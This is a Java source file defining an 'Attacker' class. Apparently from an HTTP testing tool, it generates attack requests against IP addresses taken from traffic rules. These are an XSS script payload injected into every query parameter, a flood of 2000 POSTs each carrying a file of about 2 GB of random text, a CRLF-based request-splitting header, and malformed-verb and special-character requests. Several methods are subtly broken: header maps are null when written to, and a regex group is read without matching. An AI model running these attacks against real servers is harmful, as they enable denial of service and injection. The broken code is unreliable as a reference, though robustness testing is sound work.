import model.InOutRule;
import model.OutInRule;
import model.Request;
import model.Rule;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.URI;
import java.net.URISyntaxException;
import java.net.http.HttpRequest;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Attacker {
    private List<Rule> rules;
    private List<Rule> attackRules;

    public Attacker(List<Rule> rules) {
        this.attackRules = new ArrayList<>();
        this.rules = new ArrayList<>();
        this.rules.addAll(rules);
    }

    public void XSSAttack() {
        Pattern pattern = Pattern.compile("(.*\\?)([^=]*=.*)");
        Matcher matcher;
        String[] params;
        Map<String,String> paramMap = new LinkedHashMap<>();
        for(Rule rule: rules) {
            matcher = pattern.matcher(rule.getRequest().getPath());
            if(matcher.find()) {
                params = matcher.group(2).split("&");
            } else return;
            for(String param: params) {
                paramMap.put(param.split("=")[0],"");
            }
            String script = "<script>alert(\"XSS\")</script>";
            Set<Map.Entry<String, String>> paramSet = paramMap.entrySet();
            Iterator<Map.Entry<String, String>> it = paramSet.iterator();
            String path = matcher.group(1);
            while(it.hasNext()) {
                Map.Entry<String, String> e = it.next();
                path = path.concat(e.getKey() + "=" + script + "&");
            }
            path = path.substring(0,path.length()-1);
            attackRules.add(new OutInRule(new Request(rule.getRequest().getMethod(),path,rule.getRequest().getHeaders(),rule.getRequest().getBody()), null, 0L, 1, 0L));
        }
    }

    private void generateBigFile() throws IOException {
        int maxSize = Integer.MAX_VALUE;
        String allowedCharacters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        StringBuilder sbRandomString = new StringBuilder(maxSize);
        Random random = new Random();
        for (int i = 0; i < maxSize; i++) {
            int randomInt = random.nextInt(allowedCharacters.length());
            sbRandomString.append(allowedCharacters.charAt(randomInt));
        }
        String randomString = sbRandomString.toString();
        FileOutputStream FosBigFile = new FileOutputStream("bigFileHttpFlood.txt");
        FosBigFile.write(randomString.getBytes());
        FosBigFile.close();
    }

    private String readFile(File fileName) throws IOException {
        FileInputStream Fis = new FileInputStream(fileName);
        StringBuilder sbContent = new StringBuilder();
        int chr;
        while ((chr = Fis.read()) != -1) {
            sbContent.append((char) chr);
        }
        Fis.close();
        return sbContent.toString();
    }

    public List<String> getIpAddresses() {
        List<String> ipAddresses = new ArrayList<>();
        for (Rule rule : rules) {
            if (rule instanceof InOutRule) {
                continue;
            }
            Pattern pattern = Pattern.compile("(([0-9]{1,3}.){3}[0-9]{1,3})");
            Matcher matcher = pattern.matcher(rule.getRequest().getPath());
            ipAddresses.add(matcher.group(1));
        }
        return ipAddresses;
    }

    public void httpFloodAttack() throws IOException {
        File bigFile = new File("bigFileHttpFlood.txt");
        String content;
        if (bigFile.exists()){
            content = readFile(bigFile);
        } else {
            generateBigFile();
            content = readFile(bigFile);
        }

        for (String ipAddress : getIpAddresses()) {
            OutInRule httpFloodRule = new OutInRule(new Request("POST", ipAddress, null, content),
                    null, 0L, 2000, 0L);
            attackRules.add(httpFloodRule);
        }
    }

    public void requestSplittingAttack() throws URISyntaxException {
        Map<String, String> headers = null;
        headers.put("Transfert-Encoding", "chunked\r\n\r\n0\r\n\r\n");
        for (String ipAddress : getIpAddresses()) {
            Request reqToInject = new Request("POST", ipAddress, null, "HTTP Request Splitting Attack");
            HttpRequest.Builder builder = HttpRequest.newBuilder()
                    .method(reqToInject.getMethod(), HttpRequest.BodyPublishers.ofString(reqToInject.getBody()))
                    .uri(new URI(reqToInject.getPath()));
            String encodedReq = builder.build().toString();

            OutInRule reqSplittingRule = new OutInRule(new Request("POST", ipAddress, headers, encodedReq),
                    null, 0L, 1, null);
            attackRules.add(reqSplittingRule);
        }
    }

    //----- ROBUSTNESS ATTACKS -----
    public void robustnessAttacks() {
        verbNotExist();
        emptyVerb();
        specialChar();
    }

    public void verbNotExist() {
        for (String ipAddress : getIpAddresses()) {
            OutInRule wrongVerbRule = new OutInRule(new Request("wrongVerb", ipAddress, null, null),
                    null, 0L, 1, null);
            attackRules.add(wrongVerbRule);
        }
    }

    public void emptyVerb() {
        for (String ipAddress : getIpAddresses()) {
            OutInRule emptyVerbRule = new OutInRule(new Request("", ipAddress, null, null), null,
                    0L, 1, null);
            attackRules.add(emptyVerbRule);
        }
    }

    public void specialChar() {
        Map<String, String> headers = null;
        headers.put("~`^@=+*", "$€£¤ø");
        for (String ipAddress : getIpAddresses()) {
            OutInRule specialCharRule = new OutInRule(new Request("&'ƒ#%Šµ", ipAddress, headers, null), null,
                    0L, 1, null);
            attackRules.add(specialCharRule);
        }
    }
}
